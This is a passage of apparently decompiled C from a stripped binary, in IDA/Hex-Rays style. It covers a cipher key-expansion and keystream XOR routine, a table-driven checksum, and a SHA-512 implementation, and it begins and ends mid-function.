    a1[i + 1065] = a1[i + 1061];
    ++i;
  }
  for ( j = 0; j < 8; ++j )
    a1[j] = a1[j + 1057];
  for ( k = 8; k < 0x10; ++k )
    a1[k] = a1[k + 1057];
  for ( m = 16; m < 0x110; ++m )
  {
    v2 = (unsigned __int64)(unsigned int)a1[m - 2] << 15;
    v3 = (unsigned __int64)(unsigned int)a1[m - 2] << 13;
    v4 = (unsigned __int64)(unsigned int)a1[m - 15] << 25;
    a1[m] = m
          + a1[m - 16]
          + ((a1[m - 15] >> 3) ^ ((a1[m - 15] << 14) | (a1[m - 15] >> 18)) ^ (v4 | HIDWORD(v4)))
          + a1[m - 7]
          + ((a1[m - 2] >> 10) ^ (v3 | HIDWORD(v3)) ^ (v2 | HIDWORD(v2)));
  }
  for ( n = 0; n < 0x10; ++n )
    a1[n] = a1[n + 256];
  for ( ii = 16; ii < 0x400; ++ii )
  {
    v5 = (unsigned __int64)(unsigned int)a1[ii - 2] << 15;
    v6 = (unsigned __int64)(unsigned int)a1[ii - 2] << 13;
    v7 = (unsigned __int64)(unsigned int)a1[ii - 15] << 25;
    a1[ii] = a1[ii - 16]
           + ((a1[ii - 15] >> 3) ^ ((a1[ii - 15] << 14) | (a1[ii - 15] >> 18)) ^ (v7 | HIDWORD(v7)))
           + a1[ii - 7]
           + ((a1[ii - 2] >> 10) ^ (v6 | HIDWORD(v6)) ^ (v5 | HIDWORD(v5)))
           + ii
           + 256;
  }
  result = a1;
  a1[1056] = 0;
  for ( jj = 0; jj < 0x10; ++jj )
  {
    result = a1;
    a1[jj + 1024] = a1[jj + 496];
  }
  for ( kk = 0; kk < 0x10; ++kk )
  {
    result = (_DWORD *)kk;
    a1[kk + 1040] = a1[kk + 1008];
  }
  for ( mm = 0; mm < 0x40; ++mm )
  {
    sub_40D910(a1);
    result = (_DWORD *)(mm + 1);
  }
  return result;
}

//----- (004101C0) --------------------------------------------------------
int __cdecl sub_4101C0(int a1, _DWORD *a2, _DWORD *a3, int *a4, unsigned int a5)
{
  int result; // eax
  int v6[16]; // [esp+0h] [ebp-44h] BYREF
  unsigned int i; // [esp+40h] [ebp-4h]

  while ( a5 >= 0x40 )
  {
    sub_40B170(a2, v6);
    *a4 = v6[0] ^ *a3;
    a4[1] = v6[1] ^ a3[1];
    a4[2] = v6[2] ^ a3[2];
    a4[3] = v6[3] ^ a3[3];
    a4[4] = v6[4] ^ a3[4];
    a4[5] = v6[5] ^ a3[5];
    a4[6] = v6[6] ^ a3[6];
    a4[7] = v6[7] ^ a3[7];
    a4[8] = v6[8] ^ a3[8];
    a4[9] = v6[9] ^ a3[9];
    a4[10] = v6[10] ^ a3[10];
    a4[11] = v6[11] ^ a3[11];
    a4[12] = v6[12] ^ a3[12];
    a4[13] = v6[13] ^ a3[13];
    a4[14] = v6[14] ^ a3[14];
    a4[15] = v6[15] ^ a3[15];
    result = a5 - 64;
    a5 -= 64;
    a3 += 16;
    a4 += 16;
  }
  if ( a5 )
  {
    result = sub_40B170(a2, v6);
    for ( i = 0; i < a5; ++i )
    {
      result = *((unsigned __int8 *)v6 + i);
      *((_BYTE *)a4 + i) = result ^ *((_BYTE *)a3 + i);
    }
  }
  return result;
}

//----- (004104D0) --------------------------------------------------------
int __cdecl sub_4104D0(_BYTE *a1, int a2)
{
  int i; // [esp+4h] [ebp-4h]

  for ( i = 1735290724; a2--; i = dword_403C68[(unsigned __int8)(*a1++ ^ HIBYTE(i))] ^ (i << 8) )
    ;
  return i;
}
// 403C68: using guessed type int dword_403C68[];

//----- (00410530) --------------------------------------------------------
int __cdecl sub_410530(int a1)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  result = sub_410A80(a1);
  *(_DWORD *)(a1 + 192) = 0;
  for ( i = 0; i < 4; ++i )
  {
    result = i;
    *(_DWORD *)(a1 + 4 * i + 196) = 0;
  }
  return result;
}

//----- (00410580) --------------------------------------------------------
_DWORD *__cdecl sub_410580(_DWORD *a1, int a2, unsigned int a3)
{
  _DWORD *result; // eax
  int v4[32]; // [esp+0h] [ebp-98h] BYREF
  unsigned int v5; // [esp+80h] [ebp-18h]
  unsigned int v6; // [esp+84h] [ebp-14h]
  BOOL v7; // [esp+88h] [ebp-10h]
  unsigned int v8; // [esp+8Ch] [ebp-Ch]
  int v9; // [esp+90h] [ebp-8h]
  int i; // [esp+94h] [ebp-4h]

  v9 = a2;
  v8 = a3;
  for ( i = 0; i < 4; ++i )
  {
    a1[i + 49] += v8;
    v7 = a1[i + 49] < v8;
    v8 = v7;
  }
  if ( a1[48] && (int)(a3 + a1[48]) < 128 )
  {
    sub_412DA0((int)a1 + a1[48] + 64, v9, a3);
    result = a1;
    a1[48] += a3;
  }
  else
  {
    while ( (int)(a3 + a1[48]) >= 128 )
    {
      sub_412DA0((int)a1 + a1[48] + 64, v9, 128 - a1[48]);
      v9 += 128 - a1[48];
      a3 -= 128 - a1[48];
      for ( i = 0; i < 16; ++i )
      {
        v6 = _byteswap_ulong(a1[2 * i + 16]);
        v5 = _byteswap_ulong(a1[2 * i + 17]);
        v4[2 * i] = v6;
        v4[2 * i + 1] = v5;
      }
      sub_410AD0(a1, (int)v4);
      a1[48] = 0;
    }
    sub_412DA0((int)(a1 + 16), v9, a3);
    result = a1;
    a1[48] = a3;
  }
  return result;
}

//----- (004107C0) --------------------------------------------------------
_DWORD *__cdecl sub_4107C0(_DWORD *a1, int a2)
{
  _DWORD *result; // eax
  char v3[144]; // [esp+0h] [ebp-B0h] BYREF
  unsigned int v4; // [esp+90h] [ebp-20h]
  unsigned int v5; // [esp+94h] [ebp-1Ch]
  unsigned int v7; // [esp+9Ch] [ebp-14h]
  unsigned int v8; // [esp+A0h] [ebp-10h]
  int v9; // [esp+A4h] [ebp-Ch]
  int v10; // [esp+A8h] [ebp-8h]
  int i; // [esp+ACh] [ebp-4h]

  if ( (int)a1[48] < 112 )
    v8 = 112 - a1[48];
  else
    v8 = 240 - a1[48];
  for ( i = 4; i--; *(_DWORD *)&v3[4 * i + 128] = __SPAIR64__(v5, v7) >> 29 )
  {
    v5 = a1[i + 49];
    if ( i <= 0 )
      v7 = 0;
    else
      v7 = a1[i + 48];
    v4 = v7;
  }
  sub_412D70((int)v3, 0, v8);
  v3[0] = 0x80;
  sub_410580(a1, (int)v3, v8);
  for ( i = 0; i < 4; ++i )
  {
    v3[4 * i] = HIBYTE(*(_DWORD *)&v3[4 * (3 - i) + 128]);
    v3[4 * i + 1] = BYTE2(*(_DWORD *)&v3[4 * (3 - i) + 128]);
    v3[4 * i + 2] = BYTE1(*(_DWORD *)&v3[4 * (3 - i) + 128]);
    v3[4 * i + 3] = *(_DWORD *)&v3[4 * (3 - i) + 128];
  }
  result = sub_410580(a1, (int)v3, 0x10u);
  for ( i = 0; i < 8; ++i )
  {
    v10 = a1[2 * i];
    v9 = a1[2 * i + 1];
    *(_BYTE *)(a2 + 8 * i) = HIBYTE(v10);
    *(_BYTE *)(a2 + 8 * i + 1) = BYTE2(v10);
    *(_BYTE *)(a2 + 8 * i + 2) = BYTE1(v10);
    *(_BYTE *)(a2 + 8 * i + 3) = v10;
    *(_BYTE *)(a2 + 8 * i + 4) = HIBYTE(v9);
    *(_BYTE *)(a2 + 8 * i + 5) = BYTE2(v9);
    *(_BYTE *)(a2 + 8 * i + 6) = BYTE1(v9);
    *(_BYTE *)(a2 + 8 * i + 7) = v9;
    result = (_DWORD *)(i + 1);
  }
  return result;
}

//----- (00410A30) --------------------------------------------------------
_DWORD *__cdecl sub_410A30(int a1, unsigned int a2, int a3)
{
  _DWORD v4[53]; // [esp+0h] [ebp-D4h] BYREF

  sub_410530((int)v4);
  sub_410580(v4, a1, a2);
  return sub_4107C0(v4, a3);
}
// 410A30: using guessed type _DWORD var_D4[53];

//----- (00410A80) --------------------------------------------------------
int __cdecl sub_410A80(int a1)
{
  int result; // eax
  int v2; // eax
  int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < 8; ++i )
  {
    v2 = dword_40406C[2 * i];
    *(_DWORD *)(a1 + 8 * i) = SHA256_Constants_404068[2 * i];
    *(_DWORD *)(a1 + 8 * i + 4) = v2;
    result = i + 1;
  }
  return result;
}
// 404068: using guessed type int SHA256_Constants_404068[];
// 40406C: using guessed type int dword_40406C[];

//----- (00410AD0) --------------------------------------------------------
int __cdecl sub_410AD0(_DWORD *a1, int a2)
{
  int v2; // ecx
  int v3; // edx
  int v4; // eax
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  int v10; // eax
  int v11; // edx
  int v12; // ecx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // edx
  int result; // eax
  int v21[192]; // [esp+0h] [ebp-498h]
  unsigned int v22; // [esp+300h] [ebp-198h]
  unsigned int v23; // [esp+304h] [ebp-194h]
  BOOL v24; // [esp+308h] [ebp-190h]
  BOOL v25; // [esp+30Ch] [ebp-18Ch]
  BOOL v26; // [esp+310h] [ebp-188h]
  BOOL v27; // [esp+314h] [ebp-184h]
  BOOL v28; // [esp+318h] [ebp-180h]
  BOOL v29; // [esp+31Ch] [ebp-17Ch]
  BOOL v30; // [esp+320h] [ebp-178h]
  BOOL v31; // [esp+324h] [ebp-174h]
  BOOL v32; // [esp+328h] [ebp-170h]
  BOOL v33; // [esp+32Ch] [ebp-16Ch]
  BOOL v34; // [esp+330h] [ebp-168h]
  BOOL v35; // [esp+334h] [ebp-164h]
  BOOL v36; // [esp+338h] [ebp-160h]
  BOOL v37; // [esp+33Ch] [ebp-15Ch]
  BOOL v38; // [esp+340h] [ebp-158h]
  BOOL v39; // [esp+344h] [ebp-154h]
  BOOL v40; // [esp+348h] [ebp-150h]
  BOOL v41; // [esp+34Ch] [ebp-14Ch]
  BOOL v42; // [esp+350h] [ebp-148h]
  BOOL v43; // [esp+354h] [ebp-144h]
  BOOL v44; // [esp+358h] [ebp-140h]
  BOOL v45; // [esp+35Ch] [ebp-13Ch]
  BOOL v46; // [esp+360h] [ebp-138h]
  BOOL v47; // [esp+364h] [ebp-134h]
  BOOL v48; // [esp+368h] [ebp-130h]
  BOOL v49; // [esp+36Ch] [ebp-12Ch]
  BOOL v50; // [esp+370h] [ebp-128h]
  BOOL v51; // [esp+374h] [ebp-124h]
  BOOL v52; // [esp+378h] [ebp-120h]
  BOOL v53; // [esp+37Ch] [ebp-11Ch]
  BOOL v54; // [esp+380h] [ebp-118h]
  BOOL v55; // [esp+384h] [ebp-114h]
  BOOL v56; // [esp+388h] [ebp-110h]
  BOOL v57; // [esp+38Ch] [ebp-10Ch]
  BOOL v58; // [esp+390h] [ebp-108h]
  BOOL v59; // [esp+394h] [ebp-104h]
  BOOL v60; // [esp+398h] [ebp-100h]
  BOOL v61; // [esp+39Ch] [ebp-FCh]
  BOOL v62; // [esp+3A0h] [ebp-F8h]
  BOOL v63; // [esp+3A4h] [ebp-F4h]
  BOOL v64; // [esp+3A8h] [ebp-F0h]
  BOOL v65; // [esp+3ACh] [ebp-ECh]
  BOOL v66; // [esp+3B0h] [ebp-E8h]
  BOOL v67; // [esp+3B4h] [ebp-E4h]
  BOOL v68; // [esp+3B8h] [ebp-E0h]
  BOOL v69; // [esp+3BCh] [ebp-DCh]
  BOOL v70; // [esp+3C0h] [ebp-D8h]
  BOOL v71; // [esp+3C4h] [ebp-D4h]
  BOOL v72; // [esp+3C8h] [ebp-D0h]
  BOOL v73; // [esp+3CCh] [ebp-CCh]
  BOOL v74; // [esp+3D0h] [ebp-C8h]
  BOOL v75; // [esp+3D4h] [ebp-C4h]
  BOOL v76; // [esp+3D8h] [ebp-C0h]
  BOOL v77; // [esp+3DCh] [ebp-BCh]
  BOOL v78; // [esp+3E0h] [ebp-B8h]
  BOOL v79; // [esp+3E4h] [ebp-B4h]
  BOOL v80; // [esp+3E8h] [ebp-B0h]
  BOOL v81; // [esp+3ECh] [ebp-ACh]
  BOOL v82; // [esp+3F0h] [ebp-A8h]
  BOOL v83; // [esp+3F4h] [ebp-A4h]
  BOOL v84; // [esp+3F8h] [ebp-A0h]
  BOOL v85; // [esp+3FCh] [ebp-9Ch]
  BOOL v86; // [esp+400h] [ebp-98h]
  BOOL v87; // [esp+404h] [ebp-94h]
  BOOL v88; // [esp+408h] [ebp-90h]
  BOOL v89; // [esp+40Ch] [ebp-8Ch]
  BOOL v90; // [esp+410h] [ebp-88h]
  unsigned int v91; // [esp+414h] [ebp-84h]
  unsigned int v92; // [esp+418h] [ebp-80h]
  unsigned int v93; // [esp+41Ch] [ebp-7Ch]
  unsigned int v94; // [esp+420h] [ebp-78h]
  unsigned int v95; // [esp+424h] [ebp-74h]
  unsigned int v96; // [esp+428h] [ebp-70h]
  int v97; // [esp+42Ch] [ebp-6Ch]
  int v98; // [esp+430h] [ebp-68h]
  __int64 v99; // [esp+434h] [ebp-64h]
  __int64 v100; // [esp+43Ch] [ebp-5Ch]
  __int64 v101; // [esp+444h] [ebp-54h]
  __int64 v102; // [esp+44Ch] [ebp-4Ch]
  __int64 v103; // [esp+454h] [ebp-44h]
  __int64 v104; // [esp+45Ch] [ebp-3Ch]
  __int64 v105; // [esp+464h] [ebp-34h]
  __int64 v106; // [esp+46Ch] [ebp-2Ch]
  int v107; // [esp+474h] [ebp-24h]
  unsigned int v108; // [esp+478h] [ebp-20h]
  int i; // [esp+47Ch] [ebp-1Ch]
  __int64 v110; // [esp+480h] [ebp-18h]
  __int64 v111; // [esp+488h] [ebp-10h]
  __int64 v112; // [esp+490h] [ebp-8h]

  for ( i = 0; i < 16; ++i )
  {
    v2 = *(_DWORD *)(a2 + 8 * i + 4);
    v3 = i;
    v21[2 * i + 32] = *(_DWORD *)(a2 + 8 * i);
    v21[2 * v3 + 33] = v2;
  }
  for ( i = 16; i < 80; ++i )
  {
    v96 = (v21[2 * i + 28] << 13) | ((unsigned int)v21[2 * i + 29] >> 19);
    v95 = (v21[2 * i + 29] << 13) | ((unsigned int)v21[2 * i + 28] >> 19);
    v94 = (8 * v21[2 * i + 29]) | ((unsigned int)v21[2 * i + 28] >> 29);
    v93 = (8 * v21[2 * i + 28]) | ((unsigned int)v21[2 * i + 29] >> 29);
    v96 ^= v94;
    v95 ^= v93;
    v94 = (v21[2 * i + 28] << 26) | ((unsigned int)v21[2 * i + 29] >> 6);
    v93 = (unsigned int)v21[2 * i + 28] >> 6;
    v96 ^= v94;
    v95 ^= v93;
    v92 = (v21[2 * i + 2] << 31) | ((unsigned int)v21[2 * i + 3] >> 1);
    v91 = (v21[2 * i + 3] << 31) | ((unsigned int)v21[2 * i + 2] >> 1);
    v94 = (v21[2 * i + 2] << 24) | ((unsigned int)v21[2 * i + 3] >> 8);
    v93 = (v21[2 * i + 3] << 24) | ((unsigned int)v21[2 * i + 2] >> 8);
    v92 ^= v94;
    v91 ^= v93;
    v94 = (v21[2 * i + 2] << 25) | ((unsigned int)v21[2 * i + 3] >> 7);
    v93 = (unsigned int)v21[2 * i + 2] >> 7;
    v92 ^= v94;
    v91 ^= v93;
    v23 = v96 + v92;
    v42 = v96 + v92 < v92;
    v22 = v42 + v95 + v91;
    v96 += v92 + v21[2 * i + 19];
    v39 = v96 < v21[2 * i + 19];
    v95 = v39 + v22 + v21[2 * i + 18];
    v21[2 * i + 33] = v96 + v21[2 * i + 1];
    v38 = v21[2 * i + 33] < (unsigned int)v21[2 * i + 1];
    v21[2 * i + 32] = v38 + v95 + v21[2 * i];
  }
  v4 = a1[1];
  LODWORD(v105) = *a1;
  HIDWORD(v105) = v4;
  v5 = a1[3];
  LODWORD(v104) = a1[2];
  HIDWORD(v104) = v5;
  v6 = a1[5];
  LODWORD(v103) = a1[4];
  HIDWORD(v103) = v6;
  v7 = a1[7];
  LODWORD(v106) = a1[6];
  HIDWORD(v106) = v7;
  v8 = a1[9];
  LODWORD(v102) = a1[8];
  HIDWORD(v102) = v8;
  v9 = a1[11];
  LODWORD(v101) = a1[10];
  HIDWORD(v101) = v9;
  v10 = a1[13];
  LODWORD(v100) = a1[12];
  HIDWORD(v100) = v10;
  v11 = a1[15];
  LODWORD(v99) = a1[14];
  HIDWORD(v99) = v11;
  for ( i = 0; i < 80; i += 8 )
  {
    HIDWORD(v112) = ((_DWORD)v102 << 14) | (HIDWORD(v102) >> 18);
    LODWORD(v112) = v102 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v102 << 18) | (HIDWORD(v102) >> 14));
    LODWORD(v111) = v112 ^ (v102 >> 14);
    HIDWORD(v112) = v102 >> 9;
    LODWORD(v112) = ((_DWORD)v102 << 23) | (HIDWORD(v102) >> 9);
    v111 ^= v112;
    v112 = v101 & v102;
    v110 = v101 & v102 ^ v100 & ~v102;
    v108 = HIDWORD(v111) + (HIDWORD(v101) & HIDWORD(v102) ^ HIDWORD(v100) & ~HIDWORD(v102));
    v37 = v108 < HIDWORD(v110);
    v107 = v37 + v111 + v110;
    HIDWORD(v111) = v108 + SHA512_Constants_4040AC[2 * i];
    v36 = HIDWORD(v111) < SHA512_Constants_4040AC[2 * i];
    LODWORD(v111) = v36 + v107 + SHA512_Constants_4040A8[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 33];
    v35 = HIDWORD(v110) < v21[2 * i + 33];
    LODWORD(v110) = v35 + v111 + v21[2 * i + 32];
    v108 = HIDWORD(v110) + HIDWORD(v99);
    v34 = (unsigned int)(HIDWORD(v110) + HIDWORD(v99)) < HIDWORD(v99);
    v107 = v34 + v110 + v99;
    HIDWORD(v112) = v105 >> 2;
    LODWORD(v112) = ((_DWORD)v105 << 30) | (HIDWORD(v105) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v105) | (HIDWORD(v105) >> 28));
    LODWORD(v111) = v112 ^ (v105 >> 28);
    HIDWORD(v112) = v105 >> 7;
    LODWORD(v112) = ((_DWORD)v105 << 25) | (HIDWORD(v105) >> 7);
    v111 ^= v112;
    v112 = v103 & v104 ^ v103 & v105 ^ v104 & v105;
    v33 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v33 + v112 + v111;
    v31 = (unsigned int)(HIDWORD(v110) + HIDWORD(v99) + HIDWORD(v106)) < HIDWORD(v106);
    LODWORD(v106) = v31 + v107 + v106;
    HIDWORD(v106) += HIDWORD(v110) + HIDWORD(v99);
    HIDWORD(v99) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v30 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v99) = v30 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v106 << 14) | (HIDWORD(v106) >> 18);
    LODWORD(v112) = v106 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v106 << 18) | (HIDWORD(v106) >> 14));
    LODWORD(v111) = v112 ^ (v106 >> 14);
    HIDWORD(v112) = v106 >> 9;
    LODWORD(v112) = ((_DWORD)v106 << 23) | (HIDWORD(v106) >> 9);
    v111 ^= v112;
    v112 = v102 & v106;
    v110 = v102 & v106 ^ v101 & ~v106;
    v108 = HIDWORD(v111) + (HIDWORD(v102) & HIDWORD(v106) ^ HIDWORD(v101) & ~HIDWORD(v106));
    v29 = v108 < HIDWORD(v110);
    v107 = v29 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040B4[2 * i];
    v28 = HIDWORD(v111) < dword_4040B4[2 * i];
    LODWORD(v111) = v28 + v107 + SHA512_Constants_4040B0[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 35];
    v27 = HIDWORD(v110) < v21[2 * i + 35];
    LODWORD(v110) = v27 + v111 + v21[2 * i + 34];
    v108 = HIDWORD(v110) + HIDWORD(v100);
    v26 = (unsigned int)(HIDWORD(v110) + HIDWORD(v100)) < HIDWORD(v100);
    v107 = v26 + v110 + v100;
    HIDWORD(v112) = v99 >> 2;
    LODWORD(v112) = ((_DWORD)v99 << 30) | (HIDWORD(v99) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v99) | (HIDWORD(v99) >> 28));
    LODWORD(v111) = v112 ^ (v99 >> 28);
    HIDWORD(v112) = v99 >> 7;
    LODWORD(v112) = ((_DWORD)v99 << 25) | (HIDWORD(v99) >> 7);
    v111 ^= v112;
    v112 = v104 & v105 ^ v104 & v99 ^ v105 & v99;
    v25 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v25 + v112 + v111;
    v24 = (unsigned int)(HIDWORD(v110) + HIDWORD(v100) + HIDWORD(v103)) < HIDWORD(v103);
    LODWORD(v103) = v24 + v107 + v103;
    HIDWORD(v103) += HIDWORD(v110) + HIDWORD(v100);
    HIDWORD(v100) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v90 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v100) = v90 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v103 << 14) | (HIDWORD(v103) >> 18);
    LODWORD(v112) = v103 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v103 << 18) | (HIDWORD(v103) >> 14));
    LODWORD(v111) = v112 ^ (v103 >> 14);
    HIDWORD(v112) = v103 >> 9;
    LODWORD(v112) = ((_DWORD)v103 << 23) | (HIDWORD(v103) >> 9);
    v111 ^= v112;
    v112 = v106 & v103;
    v110 = v106 & v103 ^ v102 & ~v103;
    v108 = HIDWORD(v111) + (HIDWORD(v106) & HIDWORD(v103) ^ HIDWORD(v102) & ~HIDWORD(v103));
    v89 = v108 < HIDWORD(v110);
    v107 = v89 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040BC[2 * i];
    v88 = HIDWORD(v111) < dword_4040BC[2 * i];
    LODWORD(v111) = v88 + v107 + SHA512_Constants_4040B8[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 37];
    v87 = HIDWORD(v110) < v21[2 * i + 37];
    LODWORD(v110) = v87 + v111 + v21[2 * i + 36];
    v108 = HIDWORD(v110) + HIDWORD(v101);
    v86 = (unsigned int)(HIDWORD(v110) + HIDWORD(v101)) < HIDWORD(v101);
    v107 = v86 + v110 + v101;
    HIDWORD(v112) = v100 >> 2;
    LODWORD(v112) = ((_DWORD)v100 << 30) | (HIDWORD(v100) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v100) | (HIDWORD(v100) >> 28));
    LODWORD(v111) = v112 ^ (v100 >> 28);
    HIDWORD(v112) = v100 >> 7;
    LODWORD(v112) = ((_DWORD)v100 << 25) | (HIDWORD(v100) >> 7);
    v111 ^= v112;
    v112 = v105 & v99 ^ v105 & v100 ^ v99 & v100;
    v85 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v85 + v112 + v111;
    v84 = (unsigned int)(HIDWORD(v110) + HIDWORD(v101) + HIDWORD(v104)) < HIDWORD(v104);
    LODWORD(v104) = v84 + v107 + v104;
    HIDWORD(v104) += HIDWORD(v110) + HIDWORD(v101);
    HIDWORD(v101) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v83 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v101) = v83 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v104 << 14) | (HIDWORD(v104) >> 18);
    LODWORD(v112) = v104 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v104 << 18) | (HIDWORD(v104) >> 14));
    LODWORD(v111) = v112 ^ (v104 >> 14);
    HIDWORD(v112) = v104 >> 9;
    LODWORD(v112) = ((_DWORD)v104 << 23) | (HIDWORD(v104) >> 9);
    v111 ^= v112;
    v112 = v103 & v104;
    v110 = v103 & v104 ^ v106 & ~v104;
    v108 = HIDWORD(v111) + (HIDWORD(v103) & HIDWORD(v104) ^ HIDWORD(v106) & ~HIDWORD(v104));
    v82 = v108 < HIDWORD(v110);
    v107 = v82 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040C4[2 * i];
    v81 = HIDWORD(v111) < dword_4040C4[2 * i];
    LODWORD(v111) = v81 + v107 + SHA512_Constants_4040C0[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 39];
    v80 = HIDWORD(v110) < v21[2 * i + 39];
    LODWORD(v110) = v80 + v111 + v21[2 * i + 38];
    v108 = HIDWORD(v110) + HIDWORD(v102);
    v79 = (unsigned int)(HIDWORD(v110) + HIDWORD(v102)) < HIDWORD(v102);
    v107 = v79 + v110 + v102;
    HIDWORD(v112) = v101 >> 2;
    LODWORD(v112) = ((_DWORD)v101 << 30) | (HIDWORD(v101) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v101) | (HIDWORD(v101) >> 28));
    LODWORD(v111) = v112 ^ (v101 >> 28);
    HIDWORD(v112) = v101 >> 7;
    LODWORD(v112) = ((_DWORD)v101 << 25) | (HIDWORD(v101) >> 7);
    v111 ^= v112;
    v112 = v99 & v100 ^ v99 & v101 ^ v100 & v101;
    v78 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v78 + v112 + v111;
    v77 = (unsigned int)(HIDWORD(v110) + HIDWORD(v102) + HIDWORD(v105)) < HIDWORD(v105);
    LODWORD(v105) = v77 + v107 + v105;
    HIDWORD(v105) += HIDWORD(v110) + HIDWORD(v102);
    HIDWORD(v102) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v76 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v102) = v76 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v105 << 14) | (HIDWORD(v105) >> 18);
    LODWORD(v112) = v105 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v105 << 18) | (HIDWORD(v105) >> 14));
    LODWORD(v111) = v112 ^ (v105 >> 14);
    HIDWORD(v112) = v105 >> 9;
    LODWORD(v112) = ((_DWORD)v105 << 23) | (HIDWORD(v105) >> 9);
    v111 ^= v112;
    v112 = v104 & v105;
    v110 = v104 & v105 ^ v103 & ~v105;
    v108 = HIDWORD(v111) + (HIDWORD(v104) & HIDWORD(v105) ^ HIDWORD(v103) & ~HIDWORD(v105));
    v75 = v108 < HIDWORD(v110);
    v107 = v75 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040CC[2 * i];
    v74 = HIDWORD(v111) < dword_4040CC[2 * i];
    LODWORD(v111) = v74 + v107 + dword_4040C8[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 41];
    v73 = HIDWORD(v110) < v21[2 * i + 41];
    LODWORD(v110) = v73 + v111 + v21[2 * i + 40];
    v108 = HIDWORD(v110) + HIDWORD(v106);
    v72 = (unsigned int)(HIDWORD(v110) + HIDWORD(v106)) < HIDWORD(v106);
    v107 = v72 + v110 + v106;
    HIDWORD(v112) = v102 >> 2;
    LODWORD(v112) = ((_DWORD)v102 << 30) | (HIDWORD(v102) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v102) | (HIDWORD(v102) >> 28));
    LODWORD(v111) = v112 ^ (v102 >> 28);
    HIDWORD(v112) = v102 >> 7;
    LODWORD(v112) = ((_DWORD)v102 << 25) | (HIDWORD(v102) >> 7);
    v111 ^= v112;
    v112 = v100 & v101 ^ v100 & v102 ^ v101 & v102;
    v71 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v71 + v112 + v111;
    v70 = (unsigned int)(HIDWORD(v110) + HIDWORD(v106) + HIDWORD(v99)) < HIDWORD(v99);
    LODWORD(v99) = v70 + v107 + v99;
    HIDWORD(v99) += HIDWORD(v110) + HIDWORD(v106);
    HIDWORD(v106) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v69 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v106) = v69 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v99 << 14) | (HIDWORD(v99) >> 18);
    LODWORD(v112) = v99 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v99 << 18) | (HIDWORD(v99) >> 14));
    LODWORD(v111) = v112 ^ (v99 >> 14);
    HIDWORD(v112) = v99 >> 9;
    LODWORD(v112) = ((_DWORD)v99 << 23) | (HIDWORD(v99) >> 9);
    v111 ^= v112;
    v112 = v105 & v99;
    v110 = v105 & v99 ^ v104 & ~v99;
    v108 = HIDWORD(v111) + (HIDWORD(v105) & HIDWORD(v99) ^ HIDWORD(v104) & ~HIDWORD(v99));
    v68 = v108 < HIDWORD(v110);
    v107 = v68 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040D4[2 * i];
    v67 = HIDWORD(v111) < dword_4040D4[2 * i];
    LODWORD(v111) = v67 + v107 + dword_4040D0[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 43];
    v66 = HIDWORD(v110) < v21[2 * i + 43];
    LODWORD(v110) = v66 + v111 + v21[2 * i + 42];
    v108 = HIDWORD(v110) + HIDWORD(v103);
    v65 = (unsigned int)(HIDWORD(v110) + HIDWORD(v103)) < HIDWORD(v103);
    v107 = v65 + v110 + v103;
    HIDWORD(v112) = v106 >> 2;
    LODWORD(v112) = ((_DWORD)v106 << 30) | (HIDWORD(v106) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v106) | (HIDWORD(v106) >> 28));
    LODWORD(v111) = v112 ^ (v106 >> 28);
    HIDWORD(v112) = v106 >> 7;
    LODWORD(v112) = ((_DWORD)v106 << 25) | (HIDWORD(v106) >> 7);
    v111 ^= v112;
